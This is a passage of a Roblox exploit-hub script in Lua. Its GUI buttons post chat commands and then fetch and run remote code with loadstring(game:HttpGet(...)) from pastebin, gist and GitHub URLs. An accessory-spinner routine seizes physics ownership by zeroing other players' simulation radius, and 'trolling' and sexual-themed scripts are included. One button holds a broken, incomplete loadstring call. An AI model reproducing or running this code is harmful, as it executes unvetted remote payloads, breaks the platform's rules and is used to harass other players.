				X=RigDir.X+RigDir.Z,
				Z=FwdDir.X+FwdDir.Z
			};
			local Divide = 1
			if(Vec.Z<0)then
				Divide=math.clamp(-(1.25*Vec.Z),1,2)
			end
			Vec.Z = Vec.Z/Divide
			Vec.X = Vec.X/Divide
			Hum.WalkSpeed = WalkSpeed/Divide
			local Value = Movement/10
			if(legAnims)then
				if(State=='Walk')then
					Change=2
				elseif(State=='Idle')then
					Change=1
					if(not NeutralAnims)then

					end
				elseif(State=='Jump' or State=='Fall')then
					Change=1
				end
			end
			if(NeutralAnims)then	
				if(State == 'Idle')then
					local Alpha = .2
					Animate(NK,CF.N(0,1.48,-0.1)*CF.A(M.R(-10 + 10 * M.S(Sine/15)),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(LS,CF.N(-0.72,-0.83 - 0.2 * M.C(Sine/15),-0.65)*CF.A(M.R(45.4 - 10 * M.C(Sine/15)),M.R(37.2),M.R(-16)),Alpha,'Lerp')
					Animate(LH,CF.N(-1.01,-2.8 - 0.2 * M.C(Sine/15),-1.74)*CF.A(M.R(20 + 10 * M.C(Sine/15)),M.R(40),M.R(0)),Alpha,'Lerp')
					Animate(RJ,CF.N(0,1.24 + 0.2 * M.C(Sine/15),0.07)*CF.A(M.R(-20),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(RH,CF.N(0.89,-2.77 - 0.2 * M.C(Sine/15),-1.8)*CF.A(M.R(20 +  10 * M.C(Sine/15)),M.R(-30),M.R(0)),Alpha,'Lerp')
					Animate(RS,CF.N(0.68,-0.82 - 0.2 * M.C(Sine/15),-0.68)*CF.A(M.R(42.8 - 10 * M.C(Sine/15)),M.R(-28),M.R(11.2)),Alpha,'Lerp')


				elseif(State == 'Walk')then
					local Alpha = .2
					-- Im sorry nebby..i can't figure it out ;v;

					Animate(NK,CF.N(0,1.5,0)*CF.A(M.R(0 + 10 * M.C(Sine/2)),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(LS,CF.A(M.R(-(Sine*10)),M.R(0),M.R(0))*CF.N(-0.5,-1.5,0)*CF.A(M.R(0),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(LH,CF.A(M.R(-(Sine*10)),M.R(0),M.R(0))*CF.N(-0.5,-3.99,0.01)*CF.A(M.R(0),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(RJ,CF.N(0 - 1 * M.S(Sine/4),0.70 + 5 * M.C(Sine/2),0)*CF.A(M.R(-30 + 10 * M.S(Sine/4)),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(RH,CF.A(M.R(-(Sine*10) + 180),M.R(0),M.R(0))*CF.N(0.5,-3.99,0.02)*CF.A(M.R(0),M.R(0),M.R(0)),Alpha,'Lerp')
					Animate(RS,CF.A(M.R(-(Sine*10) + 180),M.R(0),M.R(0))*CF.N(0.5,-1.5,0)*CF.A(M.R(0),M.R(0),M.R(0)),Alpha,'Lerp')

				elseif(State == 'Jump')then
					local idk = math.min(math.max(Root.Velocity.Y/75,-M.R(45)),M.R(45))
					Animate(NK,CF.N(0,1.45,0.19)*CF.A(M.R(15),M.R(0),M.R(0)),.2,'Lerp')
					Animate(LS,CF.N(-0.5,-1.06,-0.45)*CF.A(M.R(-20),M.R(0),M.R(0)),.2,'Lerp')
					Animate(LH,CF.N(-0.5,-3.35,0.61)*CF.A(M.R(-35),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RJ,CF.N(0,1.96,0.39)*CF.A(M.R(15),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RH,CF.N(0.5,-3.34,0.61)*CF.A(M.R(-35),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RS,CF.N(0.5,-1.06,-0.45)*CF.A(M.R(-20),M.R(0),M.R(0)),.2,'Lerp')
				elseif(State == 'Fall')then
					local idk = math.min(math.max(Root.Velocity.Y/75,-M.R(45)),M.R(45))
					Animate(NK,CF.N(0,1.54,-0.22)*CF.A(M.R(-15),M.R(0),M.R(0)),.2,'Lerp')
					Animate(LS,CF.N(-0.5,-0.76,-0.86)*CF.A(M.R(45),M.R(0),M.R(0)),.2,'Lerp')
					Animate(LH,CF.N(-0.5,-2.58,-2.34)*CF.A(M.R(30),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RJ,CF.N(0,1.91,-0.51)*CF.A(M.R(-20),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RH,CF.N(0.5,-2.58,-2.33)*CF.A(M.R(30),M.R(0),M.R(0)),.2,'Lerp')
					Animate(RS,CF.N(0.5,-0.76,-0.86)*CF.A(M.R(45),M.R(0),M.R(0)),.2,'Lerp')
				end
			end

		end
	end    
})

Tab:AddButton({
	Name = "Achromatic V1",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 4458601937 4506945409 4794315940 4820152700 4315489767 4524991457 ")
		Message("-net")


		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-achromatic-swords-roblox-script-5294"))() 
	end    
})


Tab:AddButton({
	Name = "Achromatic V2",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 4458601937 4506945409 4794315940 4820152700 4315489767 4524991457")
		Message("-net")

		loadstring(game:HttpGet("https://pastebin.com/raw/2cqh97aB"))()
	end    
})


Tab:AddButton({
	Name = "Thiago Glitcher",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 3033908130 4391384843 3409612660 3940375351 3438342658 3499972183 3398308134 4584042059 4622081834 9560398801")
		Message("-net")

		loadstring(game:HttpGet("https://gist.githubusercontent.com/Anoncaliber/8e339864c3f510e414c1c03f1d0ac597/raw/08900807d219db743bceb4e25fef73da416f90aa/thiago%2520glitcher%253F"))()
	end    
})


Tab:AddButton({
	Name = "Nullonizer",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 4391384843 48474313 48474294 62724852 451220849 63690008 62234425")
		Message("-net")

		loadstring(game:HttpGet("https://pastebin.com/raw/RSPaWqMd"))()
	end    
})


Tab:AddButton({
	Name = "Neptunia",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 48474313 48474294 62724852 451220849 63690008 62234425  7548993875 9350274205")
		Message("-net")

		loadstring(game:HttpGet('https://pastebin.com/raw/GKbJ8657'))()
	end    
})



Tab:AddButton({
	Name = "Cool Swords!",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-achromatic-swords-roblox-script-5294"))() 
	end    
})



Tab:AddButton({
	Name = "More Swords",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh -gh 4458601937 4506945409 4794315940 4820152700 4315489767 4524991457")
		Message("-net")

		--netless wow
		loadstring
	end    
})





Tab:AddButton({
	Name = "Star Glitcher",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 17209565095")

		Message("-net")

		loadstring(game:HttpGet("https://raw.githubusercontent.com/Gitky22/Star-Glitcher/refs/heads/main/code"))()

	end    
})

Tab:AddButton({
	Name = "Vereus",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 6531967293,12103270510,3403874988,10775031176,2493590711,9350274205,4381828509")
		Message("-net")

		loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/Qwerty/main/qwerty5.lua'))()
	end    
})

Tab:AddButton({
	Name = "Spectrum Red Glitchy",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh  4458601937 4506945409 4794315940 4820152700 4315489767 4524991457")
		Message("-net")

		loadstring(game:HttpGet('https://gist.githubusercontent.com/CorruptedExploiter/bd0b897199e40830e764a606721e9b71/raw/5e6c385ff4e9401a6d6543ba4c31028d31fbd519/gistfile1.txt'))()
	end    
})



Tab:AddButton({
	Name = "Boss",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh  4458601937 4506945409 4794315940 4820152700 4315489767 4524991457")
		Message("-net")

		loadstring(game:HttpGet('https://pastebin.com/raw/sF3xLiCT'))()

	end    
})

Tab:AddButton({
	Name = "Spider",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh  12421791940 11713077437 12103236257 12103270510 9402600266 10775031176 9867487176 9867481700 9350274205")
		Message("-net")


		loadstring(game:HttpGet("https://pastebin.com/raw/WEifMP4Q"))()
	end    
})



local Section = Tab:AddSection({
	Name = "Explode Script"
})

Tab:AddButton({
	Name = "Die.",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/uuniv1", true))()
	end    
})



Tab:AddLabel("---------------------------------------")



Tab:AddParagraph("Trolling  Scripts","- FE")



local Section = Tab:AddSection({
	Name = "Spin"
})


local spinpower = nil

Tab:AddButton({
	Name = "Spin",
	Callback = function()
		power = spinpower -- change this to make it more or less powerful

		game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
		end)
		wait(.1)
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		bambam.Force = Vector3.new(power,0,power)
		bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		FillTransparency = 1
		OutlineTransparency = 1
	end    
})


Tab:AddTextbox({
	Name = "Spin Power",
	Default = "500",
	TextDisappear = true,
	Callback = function(Peepee)
		spinpower = Peepee
	end	  
})

Tab:AddButton({
	Name = "Accessory Spinner (Requires +Fly)",
	Callback = function()
		-- .offset (how close the hats are to you)
		-- .mode (different modes up to 11)
		-- .speed (how fast the hats move)

		local plr = game.Players.LocalPlayer;
		local chr = plr.Character;
		local hum = chr.Humanoid;
		local mov = {};
		local mov2 = {};

		--[[Network]]
		coroutine.resume(coroutine.create(function()
			settings().Physics.AllowSleep = false;
			game.RunService.RenderStepped:Connect(function()
				for i, v in pairs(game.Players:GetPlayers()) do
					if v ~= plr then
						v.MaximumSimulationRadius = 0.1;
						v.SimulationRadius = 0;
					else
						v.MaximumSimulationRadius = math.pow(math.huge, math.huge);
						v.SimulationRadius = math.pow(math.huge, 2);
					end
				end
			end)
		end))

		function ftp(str)
			local pt = {};
			if str ~= 'me' and str ~= 'random' then
				for i, v in pairs(game.Players:GetPlayers()) do
					if v.Name:lower():find(str:lower()) then
						table.insert(pt, v);
					end
				end
			elseif str == 'me' then
				table.insert(pt, plr);
			elseif str == 'random' then
				table.insert(pt, game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]);
			end
			return pt;
		end

		for _, v in pairs(hum:GetAccessories()) do
			local b = v.Handle;
			b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
			b.CanCollide = false;
			b:BreakJoints();
			for _, k in pairs(v:GetChildren()) do
				if not k:IsA'SpecialMesh' and not k:IsA'Part' then
					k:Destroy();
				end
			end
			local still = Instance.new('BodyAngularVelocity', b);
			still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
			still.AngularVelocity = Vector3.new(0, 0, 0);
			local align = Instance.new('AlignPosition', b);
			align.MaxForce = 1000000;
			align.MaxVelocity = math.huge;
			align.RigidityEnabled = false;
			align.ApplyAtCenterOfMass = true;
			align.Responsiveness = 200;
			local a0 = Instance.new('Attachment', b);
			local a1 = Instance.new('Attachment', chr.Head);
			align.Attachment0 = a0;
			align.Attachment1 = a1;
			table.insert(mov, a1);
			table.insert(mov2, still);
		end

		local par = {};
		for _, v in pairs(mov) do
			local parr = Instance.new('Part', workspace);
			parr.Anchored = true;
			parr.Size = Vector3.new(1, 1, 1);
			parr.Transparency = 1;
			parr.CanCollide = false;
			table.insert(par, parr);
		end

		local rotx = 0;
		local rotz = math.pi / 2;
		local height = 0;
		local heighti = 1;
		local offset = 10;
		local speed = 0.5;
		local mode = 4;
		local angular = Vector3.new(0, 0, 0);
		local l = 1;
		game['Run Service'].RenderStepped:Connect(function()
			rotx = rotx + speed / 100;
			rotz = rotz + speed / 100;
			l = (l >= 360 and 1 or l + speed);

			for i, v in pairs(par) do
				v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0);
			end

			if heighti == 1 then
				height = height + speed / 100;
			elseif heighti == 2 then
				height = height - speed / 100;
			end
			if height > 2 then
				heighti = 2;
			end
			if height < -1 then
				heighti = 1;
			end

			if mode == 1 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset);
				end
			elseif mode == 2 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(offset, height, offset);
				end
			elseif mode == 3 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset);
				end
			elseif mode == 4 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 5 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.cos(rotz) - i) * offset);
				end
			elseif mode == 6 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.tan(rotz) - i) * offset);
				end
			elseif mode == 7 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset);
				end
			elseif mode == 8 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset);
				end
			elseif mode == 9 then
				pcall(function()
					local so = nil;
					for k, b in pairs(chr:GetChildren()) do
						if b:IsA'Tool' then
							for h, j in pairs(b:GetDescendants()) do
								if j:IsA'Sound' then
									so = j;
								end
							end
						end
					end
					if so ~= nil then
						offset = so.PlaybackLoudness / 35;
						speed = so.PlaybackLoudness / 500;
						angular = Vector3.new(0, so.PlaybackLoudness / 75, 0);
					end
				end)
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 10 then
				offset = height * 15;
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 11 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Z) + Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			end
			for _, v in pairs(mov2) do
				v.AngularVelocity = angular;
			end
		end)
		game.Players.LocalPlayer.Chatted:Connect(function(c)
			if c:split(' ')[1] == '.orbit' then
				for _, v in pairs(mov) do
					chr = ftp(c:split(' ')[2])[1].Character;
					v.Parent = ftp(c:split(' ')[2])[1].Character.HumanoidRootPart;
				end
			end
			if c:split(' ')[1] == '.speed' then
				speed = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.mode' then
				mode = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.offset' then
				offset = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.angular' then
				angular = Vector3.new(tonumber(c:split(' ')[2]), tonumber(c:split(' ')[3]), tonumber(c:split(' ')[4]));
			end
		end)

		for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(-30,0,0)
				end)
			end
		end

		game:GetService("StarterGui"):SetCore("SendNotification", { 
			Title = "Notification";
			Text = "Netless Ran";
			Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
		Duration = 16;
	end	  
})


Tab:AddButton({
	Name = "Accessory Spinner (FE, (KINDA BUGGY))",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fe-Spinning-Hat-Script/refs/heads/main/Fe%20Spinning%20Hats%20Script"))()
	end
})



local Section = Tab:AddSection({
	Name = "Sussy Scripts..."
})


Tab:AddButton({
	Name = "Ding Dong >:3",
	Callback = function()
		--snakedrake

		-- settings
		local SNAKE_LENGTH = 10
		local SNAKE_SIZE = 1
		local SNAKE_WOBBLINESS = 50
		local SNAKE_COLOR = Color3.fromRGB(220, 220, 220)
		local SNAKE_WETNESS = 5
		local SNAKE_MATERIAL = "Glass"








		-- secript
		local Character = game:GetService("Players").LocalPlayer.Character
		local Root: BasePart = Character:WaitForChild("HumanoidRootPart")

		local PpAttachment = Instance.new("Attachment")
		PpAttachment.Name = "PpAttachment"
		PpAttachment.Position = Vector3.new(0, -1, -0.5)
		PpAttachment.Orientation = Vector3.new(0, 90, 0)
		PpAttachment.Parent = Root

		local PpHolder = Instance.new("Folder")
		PpHolder.Name = "PpHolder"
		PpHolder.Parent = workspace

		local function MakeSnake(Length: number, Size: number, Wobbliness: number)
			PpHolder:ClearAllChildren()

			local LastSection
			local Sections = {}

			local PpRoot = Instance.new("Part")
			PpRoot.Transparency = 1
			PpRoot.CanCollide = false
			PpRoot.CanQuery = false
			PpRoot.CanTouch = false
			PpRoot.Massless = true
			PpRoot.Name = "NewPPRoot"
			PpRoot.Parent = PpHolder

			local NewPpAttachment = Instance.new("Attachment")
			NewPpAttachment.Parent = PpRoot

			local AlignPp = Instance.new("AlignPosition")
			AlignPp.RigidityEnabled = true
			AlignPp.Attachment0 = NewPpAttachment
			AlignPp.Attachment1 = PpAttachment
			AlignPp.Parent = PpRoot

			local AlignPpRotation = Instance.new("AlignOrientation")
			AlignPpRotation.RigidityEnabled = true
			AlignPpRotation.Attachment0 = NewPpAttachment
			AlignPpRotation.Attachment1 = PpAttachment
			AlignPpRotation.Parent = PpRoot

			local MinimumIndex = math.ceil(1 / Size) * 1

			for i = 1, math.ceil(Length) do
				local IsLastSection = i == Length

				local PpSection = Instance.new("Part")
				PpSection.Shape = IsLastSection and Enum.PartType.Ball or Enum.PartType.Cylinder
				PpSection.CanCollide = i > MinimumIndex
				PpSection.Massless = true
				PpSection.Material = Enum.Material.SmoothPlastic
				PpSection.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001)
				PpSection.Position = Root.Position
				PpSection.Color = SNAKE_COLOR
				PpSection.Reflectance = SNAKE_WETNESS / 100
				PpSection.Material = SNAKE_MATERIAL
				PpSection.Size = Vector3.one * Size

				local BackAttachment = Instance.new("Attachment")
				BackAttachment.Position = Vector3.new(IsLastSection and -0.25 or (-Size / 2), 0, 0)
				BackAttachment.Parent = PpSection

				local FrontAttachment = Instance.new("Attachment")
				FrontAttachment.Position = Vector3.new(Size / 2, 0, 0)
				FrontAttachment.Name = "Important"
				FrontAttachment.Parent = PpSection

				local BallsConstraint = Instance.new("BallSocketConstraint")
				BallsConstraint.Attachment0 = LastSection and LastSection:FindFirstChild("Important") or NewPpAttachment
				BallsConstraint.Attachment1 = BackAttachment
				BallsConstraint.Parent = PpSection

				local AlignOrientation = Instance.new("AlignOrientation")
				AlignOrientation.Responsiveness = Wobbliness or 10
				AlignOrientation.Attachment0 = BackAttachment
				AlignOrientation.Attachment1 = LastSection and LastSection:FindFirstChild("Important") or NewPpAttachment
				AlignOrientation.Parent = PpSection

				local AlignPosition = Instance.new("AlignPosition")
				AlignPosition.Responsiveness = 10
				AlignPosition.Attachment0 = BackAttachment
				AlignPosition.Attachment1 = LastSection and LastSection:FindFirstChild("Important") or PpAttachment
				AlignPosition.Parent = PpSection

				PpSection.Parent = PpHolder
				LastSection = PpSection

				table.insert(Sections, PpSection)
			end

			for _, Section in pairs(Sections) do
				for _, OtherSection in pairs(Sections) do
					if Section == OtherSection then continue end

					local Constraint = Instance.new("NoCollisionConstraint")
					Constraint.Part0 = Section
					Constraint.Part1 = OtherSection
					Constraint.Parent = Section
				end
			end
		end

		MakeSnake(SNAKE_LENGTH, SNAKE_SIZE, SNAKE_WOBBLINESS)
	end	  
})


Tab:AddButton({
	Name = "FE Ding Dong (SOON!)",
	Callback = function()
	end
})




Tab:AddButton({
	Name = "Jerk Off",
	Callback = function()

		loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
	end    
})


-- Create the GUI Frame
--[[local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false -- Prevent GUI from resetting on player death

local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local FreakylayButton = Instance.new("TextButton")

local StopAnimationsButton = Instance.new("TextButton") -- Button to stop all animations

-- Parent the GUI to the Player's ScreenGui
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-- Frame properties
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0
Frame.Position = UDim2.new(0, 0,0.406, 0)
Frame.Size = UDim2.new(0, 137,0, 186)




local dragging = false
local dragInput, dragStart, startPos

-- Update the position of the frame based on the drag input
local function update(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

-- Handle when the input starts
Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

-- Handle when the input changes (for mouse movement or touch movement)
Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

-- Update the frame's position if it's being dragged
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input == dragInput and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        update(input)
    end
end)








-- ImageLabel properties
ImageLabel.Parent = Frame
ImageLabel.BackgroundTransparency = 1
ImageLabel.Image = "http://www.roblox.com/asset/?id=72338901051172"
ImageLabel.ImageTransparency = 1
ImageLabel.Position = UDim2.new(0.036, 0, 0, 0)
ImageLabel.Size = UDim2.new(0.1, 175, 0.5, 40)
ImageLabel.BackgroundTransparency = 1



StopAnimationsButton.Parent = Frame
StopAnimationsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StopAnimationsButton.BackgroundTransparency = 0
StopAnimationsButton.Position = UDim2.new(0,0,0.215,0)
StopAnimationsButton.Size = UDim2.new(0, 137,0, 68)
StopAnimationsButton.Text = "Stop "
StopAnimationsButton.TextSize = 13
StopAnimationsButton.TextColor3 = Color3.fromRGB(0, 0, 0)

FreakylayButton.Parent = Frame
FreakylayButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FreakylayButton.BackgroundTransparency = 0
FreakylayButton.Position = UDim2.new(0,0,0.618,0)
FreakylayButton.Size = UDim2.new(0, 137,0, 68)
FreakylayButton.Text = "Freaky "
FreakylayButton.TextSize = 13
FreakylayButton.TextColor3 = Color3.fromRGB(0, 0, 0)

]]


-- Detect if on mobile or PC
local isMobile = game:GetService("UserInputService").TouchEnabled
print(isMobile and "You are on Mobile" or "You are on PC")

-- Animation setup
local currentTrack
local isOnGround = false -- Track if the character is lying down

local function playAnimation(animationId)
	local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:FindFirstChild("Humanoid")
	if humanoid then
		-- Stop the currently playing animation
		if currentTrack then
			currentTrack:Stop()
		end

		-- Play the new animation
		local animation = Instance.new("Animation")
		animation.AnimationId = animationId
		currentTrack = humanoid:LoadAnimation(animation)
		currentTrack:Play()
	end
end

-- Function to lay the character down and play the animation
local function layDownAndPlayAnimation()
	local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

	-- Set the character's orientation to be on their back
	humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(math.rad(90), 0, 0)

	-- Set the Torso and other parts to lay down
	local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")  -- Handling older and newer rigs

	if torso then
		torso.CFrame = torso.CFrame * CFrame.Angles(math.rad(13), 0, 0)
	end

	-- Prevent the character from getting up
	humanoid.PlatformStand = true
	isOnGround = true -- Track the character state

	-- Play the animation (FreakyLegs animation)
	playAnimation("rbxassetid://106772613")
end

-- Function to stop all animations, reset the character, and simulate pressing '1' key
local function stopAllAnimationsAndPressOne()
	local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")

	-- Stop any current animation
	if currentTrack then
		currentTrack:Stop()
	end

	-- If the character is lying down, reset them
	if isOnGround then
		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
		humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
		humanoid.PlatformStand = false
		isOnGround = false -- Track the reset state
	end

	-- Simulate pressing the '1' key
	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
	game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.One, false, game)
end

-- Mobile and PC support for buttons
local function handleButtonClick(button, func)
	if isMobile then
		button.TouchTap:Connect(func) -- Mobile touch input
	else
		button.MouseButton1Click:Connect(func) -- PC mouse input
	end
end


local function stop()
	stopAllAnimationsAndPressOne() -- Stop animations and press '1'
	wait(0)
	local player = game.Players.LocalPlayer
	local backpack = player:FindFirstChild("Backpack")
	if backpack then
		for _, item in pairs(backpack:GetChildren()) do
			if item:IsA("Tool") then
				item:Destroy() -- Remove the tool from the backpack
			end
		end
	end
end
local function lay()
